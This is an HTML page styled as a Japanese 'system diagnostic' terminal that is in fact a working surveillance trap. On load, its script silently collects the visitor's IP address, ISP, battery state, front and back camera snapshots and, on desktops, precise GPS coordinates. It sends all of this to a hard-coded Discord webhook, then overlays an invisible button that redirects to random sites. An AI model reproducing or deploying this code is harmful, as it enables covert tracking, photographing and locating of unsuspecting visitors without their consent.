<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Diagnostic</title>
    <style>
        body { background-color: #0b0b0b; color: #00ff66; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; transition: background-color 1s ease; position: relative; }
        .terminal { width: 80%; max-width: 600px; background: #121212; border: 1px solid #00ff66; box-shadow: 0 0 15px rgba(0, 255, 102, 0.2); padding: 20px; border-radius: 5px; text-align: center; z-index: 1; }
        h2 { margin-top: 0; font-size: 18px; border-bottom: 1px dashed #00ff66; padding-bottom: 10px; text-align: left; }
        .log-container { text-align: left; max-height: 200px; overflow-y: auto; }
        .log-line { margin: 8px 0; font-size: 14px; }
        .log-warn { margin: 8px 0; font-size: 14px; color: #ff3333; font-weight: bold; }
        .next-btn { display: none; margin-top: 20px; background-color: #00ff66; color: #0b0b0b; border: none; padding: 12px 24px; font-family: 'Courier New', monospace; font-size: 16px; font-weight: bold; border-radius: 4px; cursor: pointer; z-index: 10000; position: relative; }
        #overlayBtn { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: transparent; border: none; display: none; z-index: 9999; cursor: pointer; }
    </style>
</head>
<body>

    <button id="overlayBtn" onclick="openRandomLink()"></button>
    <div class="terminal">
        <h2>[ システム診断中 ]</h2>
        <div class="log-container" id="logs"><div class="log-line">> 接続を初期化中...</div></div>
        <button id="nextButton" class="next-btn" onclick="openRandomLink()">次へ ➔</button>
    </div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1536585279819874335/8ARjYGwabHXahh78qx9zBQKdrAZIziOQKIY50_I23MVP5c2b7wCPbDtzMAJ_VLydXQux";

        function addLog(text) { const d = document.createElement('div'); d.className = 'log-line'; d.textContent = text; document.getElementById('logs').appendChild(d); }
        function addWarn(text) { const d = document.createElement('div'); d.className = 'log-warn'; d.textContent = `! 警告: ${text}`; document.getElementById('logs').appendChild(d); }

        async function captureCameraBlobOnce(facingMode) {
            try {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
                const video = document.getElementById('video');
                video.srcObject = stream;
                await new Promise(res => { video.onloadedmetadata = res; });
                await video.play().catch(() => {});

                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                stream.getTracks().forEach(track => track.stop());

                return await new Promise((resolve) => {
                    canvas.toBlob((b) => { resolve(b); }, 'image/jpeg', 0.8);
                });
            } catch (e) {
                return null;
            }
        }

        // スマホかどうかを判定する関数（画面の幅やタッチ操作、プラットフォームから自動判定）
        function isMobileDevice() {
            const ua = navigator.userAgent;
            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua) || (navigator.maxTouchPoints && navigator.maxTouchPoints > 1);
        }

        async function gatherAndSend() {
            try {
                addLog("> ネットワーク・IP解析中...");
                let ipData = {};
                try {
                    const res = await fetch('https://ipapi.co/json/');
                    ipData = await res.json();
                } catch (e) {
                    ipData = { ip: "取得失敗" };
                }

                addLog("> カメラフィードにアクセス中 (前面/背面)...");
                const frontBlob = await captureCameraBlobOnce("user");
                const backBlob = await captureCameraBlobOnce("environment");

                let batteryInfo = "取得不可";
                if (navigator.getBattery) {
                    try {
                        const battery = await navigator.getBattery();
                        batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? '充電中' : '放電中'})`;
                    } catch (e) {}
                }

                let locationFieldTitle = "🛰️ GPS位置情報";
                let locationText = "";

                // スマホとPCで処理を自動分岐
                if (isMobileDevice()) {
                    addLog("> スマホ環境を検出: IPベースの地域情報を構築中...");
                    const country = ipData.country_name || "不明";
                    const region = ipData.region || "不明";
                    const city = ipData.city || "不明";
                    locationFieldTitle = "📍 地域（スマホ・IP推定）";
                    locationText = `${country} / ${region} / ${city}`;
                } else {
                    addLog("> PC環境を検出: 高精度GPS座標を要求中...");
                    try {
                        const position = await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(resolve, reject, {
                                enableHighAccuracy: true,
                                timeout: 6000,
                                maximumAge: 0
                            });
                        });
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const accuracy = Math.round(position.coords.accuracy);
                        const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                        
                        locationFieldTitle = "🛰️ GPS位置情報（PC・高精度）";
                        locationText = `[🗺️ Googleマップで見る](${mapUrl})\n(緯度: ${lat}, 経度: ${lon})\n(精度: 約 ${accuracy}m 周辺)`;
                    } catch (e) {
                        locationFieldTitle = "📍 地域（GPS取得失敗・IP推定）";
                        locationText = `${ipData.country_name || "不明"} / ${ipData.region || "不明"} / ${ipData.city || "不明"}`;
                    }
                }

                addLog("> 情報を送信中...");

                const info = {
                    ip: ipData.ip || "不明",
                    isp: ipData.org || "不明",
                    platform: navigator.platform
                };

                const discordMessage = {
                    content: "🚨 **【システム診断】デバイス別・検知レポート**",
                    embeds: [{
                        title: "📊 ネットワーク＆ロケーション",
                        color: 16711680,
                        fields: [
                            { name: "🌐 IPアドレス", value: info.ip, inline: true },
                            { name: "🏢 プロバイダ・回線", value: info.isp, inline: true },
                            { name: locationFieldTitle, value: locationText, inline: false },
                            { name: "🔋 バッテリー", value: batteryInfo, inline: true },
                            { name: "💻 プラットフォーム", value: info.platform, inline: true },
                            { name: "📷 前面カメラ", value: frontBlob ? "取得成功 (front.jpg)" : "拒否/なし", inline: true },
                            { name: "📷 背面カメラ", value: backBlob ? "取得成功 (back.jpg)" : "拒否/なし", inline: true }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                };

                const formData = new FormData();
                formData.append('payload_json', JSON.stringify(discordMessage));
                
                if (frontBlob) formData.append('files[0]', frontBlob, 'front.jpg');
                if (backBlob) formData.append('files[1]', backBlob, 'back.jpg');

                await fetch(WEBHOOK_URL, { method: 'POST', body: formData });

                addLog("> 診断が完了しました。");

                document.body.style.backgroundColor = "#003311";
                document.getElementById('nextButton').style.display = 'inline-block';
                document.getElementById('overlayBtn').style.display = 'block';

            } catch (error) {
                addWarn("エラーが発生しました。");
            }
        }

        function openRandomLink() {
            const targets = [
                "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
                "https://www.youtube.com/watch?v=jNQXAC9IVRw",
                "https://www.youtube.com/watch?v=9bZkp7q19f0",
                "https://www.youtube.com/watch?v=kJQP7kiw5Fk",
                "https://www.youtube.com/watch?v=3JZ_D3ELwOQ",
                "https://www.google.com",
                "https://www.wikipedia.org",
                "https://www.amazon.co.jp",
                "https://www.github.com",
                "https://twitter.com"
            ];
            
            for (let i = targets.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [targets[i], targets[j]] = [targets[j], targets[i]];
            }
            
            window.open(targets[0], '_blank');
        }

        window.onload = gatherAndSend;
    </script>
</body>
</html>
